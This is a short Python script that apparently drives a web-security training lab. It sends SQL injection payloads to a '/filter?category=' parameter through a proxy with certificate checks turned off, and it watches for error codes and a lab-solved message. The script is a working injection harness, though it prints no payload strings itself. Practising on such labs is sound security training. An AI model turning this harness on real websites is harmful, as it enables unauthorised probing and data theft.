import requests
from urllib.parse import quote
from proxies import proxies
from sqli_utils import *

def solve(url: str, payload: str):
    r = requests.session()
    print("[~] Testing payload: {}".format(url + '/filter?category=' + quote(payload)))
    res = r.get(url + '/filter?category=' + quote(payload), verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return False
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")

    if "Congratulations, you solved the lab!" in res.text:
        print("[+] ================================")
        return True

    return False
